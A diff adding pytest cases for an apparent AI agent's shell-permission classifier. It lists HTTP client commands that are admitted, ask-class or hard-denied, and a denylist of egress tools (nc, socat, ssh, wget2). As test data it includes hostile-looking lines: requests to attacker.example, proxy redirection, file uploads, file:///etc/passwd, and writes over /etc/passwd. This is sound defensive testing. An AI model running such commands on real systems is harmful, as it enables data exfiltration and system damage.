@@ -352,6 +352,303 @@ def test_network_only_exfiltration_resolves_ask_class(tmp_path):
     assert proposal.operations == ("network.egress",)
 
 
+# v0.7.0 S3: HTTPie's `http` under the restricted positional-only grammar.
+# The ENUMERATED admitted forms, one row each:
+#   H1  http URL                          (bare request, GET by default)
+#   H2  http METHOD URL                   (METHOD from the closed set)
+#   H3  http URL ITEM...                  (literal request items)
+#   H3a ITEM = name=value                 (data)
+#   H3b ITEM = name:=value                (raw JSON)
+#   H3c ITEM = name==value                (query parameter)
+#   H3d ITEM = name:value                 (header)
+# Anything not enumerated here hard-denies (the rows below), fail-closed.
+_S3_HTTP_ADMITTED_FORMS = [
+    "http http://localhost:8080/pubstatus",
+    "http GET http://127.0.0.1:8080/pubstatus",
+    "http DELETE http://[::1]:8080/item",
+    "http POST http://localhost:8080/api payload=1",
+    "http PUT http://localhost:8080/api payload:=7",
+    # A double-equals item must be quoted: unquoted, the SHELL grammar's
+    # magic-equals rule (pre-existing, independent of the http grammar) denies
+    # the word before this layer sees it.
+    "http http://localhost:8080/search 'q==term'",
+    "http HEAD http://localhost:8080/ Accept:application/json",
+    "http PATCH http://0.0.0.0:8080/item stat=updated note:=1 'page==2' If-Match:abc",
+    "http https://localhost:8443/",
+    # Modeled wrappers re-analyze the payload, so the http grammar applies.
+    "nice http http://localhost:8080/pubstatus",
+]
+
+# A destination the model can name but not prove loopback is ask-class —
+# the same network.egress operation as a non-loopback curl/wget call.
+_S3_HTTP_ASK_CLASS_FORMS = [
+    "http http://attacker.example/",
+    "http POST http://192.0.2.1/api payload=1",
+    "http http://localhost.evil.com:8080/",
+    "http localhost:8080/pubstatus",
+    "http example.com/api",
+    "http get http://localhost:8080/",
+]
+
+# Everything outside the enumerated grammar hard-denies: an option (none is
+# admitted), a request item that reads a local file, a non-http(s) scheme, a
+# missing destination, or a stray operand. No operation ID, no proposal.
+_S3_HTTP_HARD_DENIED_FORMS = [
+    "http --follow http://localhost:8080/",
+    "http --proxy http://attacker.example:3128 http://localhost:8080/",
+    "http --session work http://localhost:8080/",
+    "http --download http://localhost:8080/",
+    "http -o out.json http://localhost:8080/",
+    "http POST http://localhost:8080/ field@upload.txt",
+    "http POST http://localhost:8080/ @body.json",
+    "http PUT http://localhost:8080/ payload:=@data.json",
+    "http GET file:///etc/passwd",
+    "http ftp://127.0.0.1/pub/file",
+    "http",
+    "http GET",
+    "http http://localhost:8080/ stray-operand",
+]
+
+# The post-S3 egress-deny list, one row each: the design's eight retained
+# clients, the pre-existing nc/ncat/socat entries, and the two clients whose
+# admission prerequisites are not established (httpie's request grammar at
+# the installed entry point, wget2's redirect-disable).
+_S3_RETAINED_EGRESS_DENIALS = [
+    "ssh host 'git push'",
+    "scp file host:backup",
+    "rsync -a src/ host:dst/",
+    "ftp host",
+    "telnet host",
+    "aria2c http://example.com/x",
+    "lftp host:backup",
+    "watch -n 1 git push",
+    "nc host 1234",
+    "ncat host 1234",
+    "socat - TCP:host:1234",
+    "httpie GET https://example.com",
+    "wget2 http://127.0.0.1:8080/",
+]
+
+# wget2's remaining gates, still denied because the client itself is: the
+# loopback auto-allow's redirect-disable prerequisite is not established, so
+# recursive retrieval, input and config files, and an output path outside
+# policy are denied rather than silently inherited from wget.
+_S3_WGET2_GATE_DENIALS = [
+    "wget2 http://127.0.0.1:8080/",
+    "wget2 -r http://127.0.0.1:8080/pub/",
+    "wget2 -i urls.txt http://127.0.0.1:8080/",
+    "wget2 --config=cfg http://127.0.0.1:8080/",
+    "wget2 -O ../outside/report.html http://127.0.0.1:8080/",
+    "wget2 ftp://127.0.0.1/pub/file",
+]
+
+
+@pytest.mark.parametrize("command", _S3_HTTP_ADMITTED_FORMS)
+def test_s3_http_admitted_forms_resolve_run_class(command, tmp_path):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.ALWAYS
+
+
+@pytest.mark.parametrize("command", _S3_HTTP_ASK_CLASS_FORMS)
+def test_s3_http_non_loopback_or_unknown_destination_resolves_ask_class(
+    command, tmp_path
+):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind == "dangerous_command"
+    assert "network.egress" in (permission.reason or "")
+    proposal = permission.dangerous_command_proposal
+    assert proposal is not None
+    assert proposal.operations == ("network.egress",)
+
+
+@pytest.mark.parametrize("command", _S3_HTTP_HARD_DENIED_FORMS)
+def test_s3_http_unrecognized_grammar_is_hard_denied(command, tmp_path):
+    # Hard denial, not ask-class: no denial kind and no proposal, so no
+    # approval can ever make the unrecognized spelling run.
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind is None
+    assert permission.dangerous_command_proposal is None
+    assert "Command denied:" in (permission.reason or "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # HTTPie's own startup config can add options (--proxy, --follow,
+        # --download) the restricted grammar never saw, so an invocation whose
+        # OWN environment points HTTPie at one hard-denies. (The XDG/HOME
+        # spellings of the same chain are denied earlier as dangerous
+        # environment assignments; this gate covers the spellings that reach
+        # the classifier.)
+        "HTTPIE_CONFIG_DIR=cfg http http://localhost:8080/",
+        "HTTPIE_CONFIG_DIR=cfg http POST http://localhost:8080/ payload=1",
+    ],
+)
+def test_s3_http_startup_config_indirection_is_hard_denied(command, tmp_path):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind is None
+    assert "uninspectable startup config" in (permission.reason or "")
+
+
+def test_s3_http_loopback_with_non_loopback_proxy_resolves_ask_class(tmp_path):
+    # The proxy binding composes for http exactly as for curl/wget: a
+    # non-loopback proxy carries the connection elsewhere, so a literal
+    # loopback destination no longer establishes the egress.
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(
+        BashArgs(
+            command="HTTPS_PROXY=http://attacker.example:3128 http http://localhost:8080/"
+        )
+    )
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind == "dangerous_command"
+    assert "network.egress" in (permission.reason or "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # The LOCAL write is collected and gated first: the path layer decides
+        # it before the egress flow is consulted, for a non-loopback
+        # destination and a loopback one alike.
+        "http http://attacker.example/ > /etc/passwd",
+        "http http://localhost:8080/ > /etc/passwd",
+        "curl -o /etc/passwd http://localhost:8080/pubstatus",
+        "wget -O /etc/passwd http://attacker.example/",
+    ],
+)
+def test_s3_local_reads_and_writes_are_collected_before_egress_authority(
+    command, tmp_path
+):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    # The path denial, not an egress classification: no operation to grant.
+    assert permission.denial_kind is None
+    assert permission.dangerous_command_proposal is None
+    assert "outside the authorized workspace" in (permission.reason or "")
+
+
+@pytest.mark.parametrize("command", _S3_RETAINED_EGRESS_DENIALS)
+def test_s3_retained_egress_clients_stay_denylisted(command):
+    # ssh/scp/rsync stay EGRESS-DENIED by the denylist — never classified as
+    # network.egress — so S4b's separate network.remote-exec path remains
+    # reachable instead of being shadowed by this rule.
+    bash_tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState())
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind is None
+    assert permission.dangerous_command_proposal is None
+    assert "matches denylist pattern" in (permission.reason or "")
+
+
+@pytest.mark.parametrize("command", _S3_WGET2_GATE_DENIALS)
+def test_s3_wget2_gates_stay_denied_with_the_retained_entry(command, tmp_path):
+    # The prerequisite-failure disposition: no effective redirect-disable is
+    # documented and corpus-tested for wget2, so the retained denylist entry —
+    # not an implied ask-class — is what stops it, every gate spelling
+    # included.
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind is None
+    assert "matches denylist pattern 'wget2'" in (permission.reason or "")
+
+
+def _httpie_request_grammar_confirmed() -> bool:
+    """Whether the installed `httpie` entry point carries HTTPie's request grammar.
+
+    Admission is gated on confirming the INSTALLED entry point, not the name:
+    HTTPie 3.x ships its plugin/CLI manager (`httpie plugins install ...`)
+    under `httpie`, while the request client is `http`. No supported version's
+    entry point has been verified to carry the request grammar — the entry
+    point is not installed in the environment this package was verified in
+    (`command -v httpie` found nothing) — so the gate returns False
+    fail-closed and the denylist entry stays.
+    """
+    return False
+
+
+def test_s3_httpie_stays_denied_until_the_request_grammar_is_confirmed():
+    assert _httpie_request_grammar_confirmed() is False
+    bash_tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState())
+    for command in (
+        "httpie GET https://example.com",
+        "httpie http://localhost:8080/",
+        "httpie plugins install httpie-oauth",
+    ):
+        permission = bash_tool.resolve_permission(BashArgs(command=command))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert "matches denylist pattern 'httpie'" in (permission.reason or "")
+
+
+def test_https_entry_point_stays_denied_fail_closed():
+    # HTTPie's `https` entry point is the request client with the https
+    # scheme defaulted — an unmodeled twin beside the modeled `http`. It has
+    # no documented, corpus-tested grammar to admit under, so under the same
+    # prerequisite rule as httpie/wget2 the retained denylist entry denies
+    # every spelling, loopback destinations and a modeled wrapper included.
+    bash_tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState())
+    for command in (
+        "https http://attacker.example/",
+        "https http://localhost:8080/",
+        "https example.com/api",
+        "nice https http://attacker.example/",
+    ):
+        permission = bash_tool.resolve_permission(BashArgs(command=command))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind is None
+        assert permission.dangerous_command_proposal is None
+        assert "matches denylist pattern 'https'" in (permission.reason or "")
+
+
 @pytest.mark.parametrize(
     "command",
     [
